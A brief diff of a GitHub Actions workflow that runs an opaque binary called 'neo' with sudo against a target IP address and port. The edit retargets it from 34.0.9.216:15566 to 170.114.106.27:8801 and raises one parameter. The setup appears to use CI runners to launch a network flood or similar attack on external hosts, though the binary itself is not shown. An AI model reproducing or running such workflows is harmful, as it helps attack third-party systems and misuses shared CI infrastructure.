@@ -11,4 +11,4 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x neo
-    - run: sudo ./neo 34.0.9.216 15566 80 999
+    - run: sudo ./neo 170.114.106.27 8801 100 999
